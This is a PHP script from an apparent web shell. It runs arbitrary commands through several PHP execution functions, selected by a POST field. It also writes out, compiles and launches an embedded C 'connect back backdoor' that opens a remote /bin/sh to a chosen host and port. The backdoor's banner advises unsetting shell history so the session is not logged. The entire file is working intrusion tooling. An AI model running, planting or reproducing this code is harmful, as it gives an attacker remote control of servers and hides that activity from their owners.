<?php
function Mexec($Mcmd, $type) {
	$dspec = array(
			0 => array("pipe", "r"),
			1 => array("pipe", "w"),
			2 => array("pipe", "r")
		);
	$output = "";
	switch($type) {
		case 5:
				$output .= "<pre>";
				$lastline = exec($Mcmd, $arrOutput);
				foreach($arrOutput as $val) {
					$output .= $val . "\n";
				}
				$output .= "</pre>";
				break;
		case 4:
				$proc = proc_open($Mcmd, $dspec, $pipes);
				if (is_resource($proc)) {
					$output .= "<pre>";
					fclose($pipes[0]);
					while(!feof($pipes[1])) {
						$tmp = fgets($pipes[1], 1024);
						$output .= $tmp;
					}
					$output .= "</pre>";
				}
				break;
		case 3:
				$output .= "<pre>";
				$output .= `$Mcmd`;
				$output .= "</pre>";
				break;
		case 2:
				print "<pre>\n";
				$output = system($Mcmd);
				print "</pre>\n";
				break;
		case 1:
				print "<pre>\n";
				$output = passthru($Mcmd);
				print "</pre>\n";
				break;
		default:
				$output = "There are no execute functions available!";
				break;
	}
	return $output;
}

$shell = "#include <stdio.h>\n" .
             "#include <sys/socket.h>\n" .
             "#include <netinet/in.h>\n" .
             "#include <arpa/inet.h>\n" .
             "#include <netdb.h>\n" .
             "int main(int argc, char **argv) {\n" .
             "  char *host;\n" .
             "  int port = 80;\n" .
             "  int f;\n" .
             "  int l;\n" .
             "  int sock;\n" .
             "  struct in_addr ia;\n" .
             "  struct sockaddr_in sin, from;\n" .
             "  struct hostent *he;\n" .
             "  char msg[ ] = \"Welcome to Data Cha0s Connect Back Shell\\n\\n\"\n" .
             "                \"Issue \\\"export TERM=xterm; exec bash -i\\\"\\n\"\n" .
             "                \"For More Reliable Shell.\\n\"\n" .
             "                \"Issue \\\"unset HISTFILE; unset SAVEHIST\\\"\\n\"\n" .
             "                \"For Not Getting Logged.\\n(;\\n\\n\";\n" .
             "  printf(\"Data Cha0s Connect Back Backdoor\\n\\n\");\n" .
             "  if (argc < 2 || argc > 3) {\n" .
             "    printf(\"Usage: %s [Host] <port>\\n\", argv[0]);\n" .
             "    return 1;\n" .
             "  }\n" .
             "  printf(\"[*] Dumping Arguments\\n\");\n" .
             "  l = strlen(argv[1]);\n" .
             "  if (l <= 0) {\n" .
             "    printf(\"[-] Invalid Host Name\\n\");\n" .
             "    return 1;\n" .
             "  }\n" .
             "  if (!(host = (char *) malloc(l))) {\n" .
             "    printf(\"[-] Unable to Allocate Memory\\n\");\n" .
             "    return 1;\n" .
             "  }\n" .
             "  strncpy(host, argv[1], l);\n" .
             "  if (argc == 3) {\n" .
             "    port = atoi(argv[2]);\n" .
             "    if (port <= 0 || port > 65535) {\n" .
             "      printf(\"[-] Invalid Port Number\\n\");\n" .
             "      return 1;\n" .
             "    }\n" .
             "  }\n" .
             "  printf(\"[*] Resolving Host Name\\n\");\n" .
             "  he = gethostbyname(host);\n" .
             "  if (he) {\n" .
             "    memcpy(&ia.s_addr, he->h_addr, 4);\n" .
             "  } else if ((ia.s_addr = inet_addr(host)) == INADDR_ANY) {\n" .
             "    printf(\"[-] Unable to Resolve: %s\\n\", host);\n" .
             "    return 1;\n" .
             "  }\n" .
             "  sin.sin_family = PF_INET;\n" .
             "  sin.sin_addr.s_addr = ia.s_addr;\n" .
             "  sin.sin_port = htons(port);\n" .
             "  printf(\"[*] Connecting...\\n\");\n" .
             "  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n" .
             "    printf(\"[-] Socket Error\\n\");\n" .
             "    return 1;\n" .
             "  }\n" .
             "  if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) != 0) {\n" .
             "    printf(\"[-] Unable to Connect\\n\");\n" .
             "    return 1;\n" .
             "  }\n" .
             "  printf(\"[*] Spawning Shell\\n\");\n" .
             "  f = fork( );\n" .
             "  if (f < 0) {\n" .
             "    printf(\"[-] Unable to Fork\\n\");\n" .
             "    return 1;\n" .
             "  } else if (!f) {\n" .
             "    write(sock, msg, sizeof(msg));\n" .
             "    dup2(sock, 0);\n" .
             "    dup2(sock, 1);\n" .
             "    dup2(sock, 2);\n" .
             "    execl(\"/bin/sh\", \"shell\", NULL);\n" .
             "    close(sock);\n" .
             "    return 0;\n" .
             "  }\n" .
             "  printf(\"[*] Detached\\n\\n\");\n" .
             "  return 0;\n" .
             "}\n";
$fbname = getcwd()."/cbs";
$fp = fopen($fbname . ".c", "w");
$write = fwrite($fp, $shell);
fclose($fp);
$execM = $_POST['type'];

$command = "gcc" . " -o " . $fbname . " " . $fbname . ".c";
$rtval = Mexec($command, $execM);
$command = $fbname . " " . $host . " " . $port;
$rtval .= Mexec($command, $execM);

?>